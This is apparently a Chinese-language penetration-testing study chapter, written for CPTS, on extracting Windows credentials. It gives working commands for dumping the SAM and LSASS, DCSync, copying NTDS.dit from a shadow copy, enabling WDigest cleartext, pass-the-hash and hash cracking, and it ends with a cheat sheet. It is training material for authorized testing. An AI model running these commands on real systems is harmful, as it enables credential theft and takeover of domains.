# 第 61 章 - Windows 認證資料

## 標籤

- #cpts
- #chapter
- #windows
- #credentials

## 學習目標

- 能從 SAM、LSASS、LSA Secrets、DPAPI 等位置提取 Windows 憑證材料。
- 知道各種工具（secretsdump、pypykatz、Mimikatz）的適用場景與限制。
- 能分辨 NTLM hash、NetNTLM、明文密碼的不同用途。
- 理解本機帳號 vs 網域帳號材料的橫向移動價值差異。

---

## 理論基礎：Windows 憑證儲存位置

| 位置 | 內容 | 存取條件 | 工具 |
|------|------|----------|------|
| SAM 登錄檔 | 本機帳號 NTLM hash | SYSTEM 權限 | secretsdump / reg save |
| LSASS 記憶體 | 登入的帳號明文/hash/ticket | SYSTEM/SeDebugPrivilege | Mimikatz / pypykatz |
| LSA Secrets | 服務帳號、DPAPI 機器金鑰 | SYSTEM 權限 | secretsdump |
| NTDS.dit | 所有 AD 帳號 NTLM hash | DC SYSTEM 或 VSS | secretsdump |
| 記憶體 / 登錄 | 明文密碼（WDigest）| 舊版 Win 預設啟用 | Mimikatz |
| DPAPI | 瀏覽器密碼、憑證 | 使用者上下文 | mimikatz / dpapi.py |

---

## 方法一：遠端提取（secretsdump）

```bash
# 遠端從 SAM + LSA Secrets 提取（需管理員憑證）
impacket-secretsdump DOMAIN/USER:PASSWORD@TARGET_IP
# 需要對方 445 開放且有管理員權限
# 輸出包含：
#   [*] SAM hashes    → 本機帳號 NT hash（格式：帳號:RID:LM:NT:::）
#   [*] LSA secrets   → DPAPI、服務帳號密碼等
#   [*] Cached domain logon info → 快取網域憑證（DCC2 格式）

# 只提取 SAM
impacket-secretsdump DOMAIN/USER:PASSWORD@TARGET_IP -just-dc-ntlm
# -just-dc-ntlm → 只輸出 NTLM hash（適合 DC，從 NTDS.dit）

# 用 hash 認證（PTH）
impacket-secretsdump -hashes ':NTHASH' DOMAIN/USER@TARGET_IP
# -hashes ':NTHASH' → LM:NT 格式，LM 可以留空（只需 NT）

# 從本機 SAM + SYSTEM 登錄檔（離線，需先 reg save）
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
# LOCAL → 離線模式
# 需要三個檔案：SAM、SECURITY、SYSTEM
```

---

## 方法二：本機提取 SAM（reg save）

```bash
# 需要 SYSTEM 或 Administrator 權限

# 匯出登錄 hive（在目標 Windows 上執行）
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
# reg save → 將登錄 hive 儲存為檔案
# HKLM\SAM    → 本機帳號密碼 hash
# HKLM\SYSTEM → 包含解密 SAM 所需的 bootkey
# HKLM\SECURITY → LSA secrets

# 下載回攻擊機（smbserver 或 curl 等）
# 然後離線解析
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```

---

## 方法三：LSASS 記憶體提取

```bash
# 方式一：Task Manager（互動式桌面）
# 開啟 Task Manager → 找 lsass.exe → 右鍵 Create dump file
# 產生 C:\Users\[USER]\AppData\Local\Temp\lsass.DMP

# 方式二：comsvcs.dll（無需額外工具，需 SYSTEM）
# 在目標 PowerShell（管理員）執行：
$lsass_id = (Get-Process lsass).Id
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $lsass_id C:\Temp\lsass.dmp full
# MiniDump → comsvcs 導出函數
# $lsass_id → lsass 的 PID
# C:\Temp\lsass.dmp → 輸出路徑
# full → 完整記憶體 dump

# 方式三：ProcDump（Sysinternals）
.\procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
# -ma → 完整記憶體 dump（minidump all）
# -accepteula → 接受授權（非互動）

# 解析 LSASS dump（在攻擊機上）
pypykatz lsa minidump lsass.dmp
# pypykatz → Mimikatz 的 Python 實作
# lsa minidump → 從 minidump 提取 LSA 憑證
# 輸出：NT hash、SHA1、明文（若 WDigest 啟用）

# 或用 Mimikatz（在目標上執行）
mimikatz.exe
sekurlsa::logonpasswords
# sekurlsa::logonpasswords → 提取所有已登入帳號的憑證
# 輸出：Username / Domain / NTLM / SHA1 / 若有明文則顯示
```

---

## 方法四：從 NTDS.dit 提取（DC）

```bash
# 方式一：volume shadow copy（VSS）
# 在 DC 上（需管理員）建立 VSS 並複製 NTDS.dit
vssadmin create shadow /for=C:
# 列出影子複本
vssadmin list shadows
# 從影子複本複製
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\NTDS.dit
copy \\?\GLOBALROOT\Device\...\Windows\System32\config\SYSTEM C:\Temp\SYSTEM

# 離線解析
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
# -ntds NTDS.dit → 指定 NTDS 檔案
# 輸出：所有 AD 帳號 NTLM hash（格式：domain\username:RID:LM:NT:::）

# 方式二：DCSync（需 DC Replication 權限）
impacket-secretsdump DOMAIN/USER:PASSWORD@DC_IP -just-dc
# DCSync → 偽裝成 DC 向目標 DC 請求複製
# 不需要 NTDS.dit 檔案，直接透過協定取得
# 需要 DS-Replication-Get-Changes + DS-Replication-Get-Changes-All 權限
```

---

## 輸出格式解讀

```text
# secretsdump 輸出格式：
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
#   帳號名稱    :RID: LM hash (通常是空值 aad3...) : NT hash :::

# 提取後操作
# 1. 直接 PTH（Pass the Hash）
nxc smb TARGET_IP -u Administrator -H '31d6cfe0d16ae931b73c59d7e0c089c0'
# -H → NT hash（不需要明文密碼）

# 2. 離線破解 NT hash
hashcat -m 1000 admin.hash /usr/share/wordlists/rockyou.txt
# -m 1000 → NTLM 模式

# WDigest 明文啟用（舊版 Windows 或手動開啟）
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
# 等待使用者重新登入後 Mimikatz 可提取明文
```

---

## 憑證材料價值判斷

```
取得材料
    ↓
判斷帳號類型
    ├─ 本機管理員 → 確認是否跨主機重用（nxc 掃網段）
    ├─ 網域使用者 → 確認群組與權限（AD 橫向價值）
    └─ 網域管理員 → 高價值，DCSync / 全域控制
    ↓
判斷材料格式
    ├─ NT hash → 可 PTH（smb/winrm/rdp）或離線破解
    ├─ NetNTLMv2 → 不能 PTH，只能離線破解
    └─ 明文 → 直接驗證所有服務
    ↓
選擇行動
    ├─ PTH：nxc smb -H 'NTHASH'
    ├─ 破解：hashcat -m 1000
    └─ 重用驗證：nxc 掃整個網段
```

---

## 速查表

```bash
# 遠端 dump SAM
impacket-secretsdump DOMAIN/USER:PASS@TARGET_IP

# 用 hash 認證 dump
impacket-secretsdump -hashes ':NTHASH' DOMAIN/USER@TARGET_IP

# 本機 reg save + 離線解析
reg save HKLM\SAM SAM && reg save HKLM\SYSTEM SYSTEM && reg save HKLM\SECURITY SECURITY
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL

# LSASS dump 解析
pypykatz lsa minidump lsass.dmp

# NTDS.dit 離線解析
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

# DCSync
impacket-secretsdump DOMAIN/USER:PASS@DC_IP -just-dc

# PTH 驗證
nxc smb TARGET_IP -u Administrator -H 'NTHASH'

# NT hash 破解
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 關聯筆記

- [[60-雜湊識別與破解|第 60 章 - 雜湊識別與破解]]
- [[62-Kerberos認證資料攻擊|第 62 章 - Kerberos 認證資料攻擊]]
- [[63-密碼重複使用與認證驗證|第 63 章 - 密碼重複使用與認證驗證]]
- [[07-Volume-7-Password-Attacks-Index|Vol.7 - Password Attacks]]
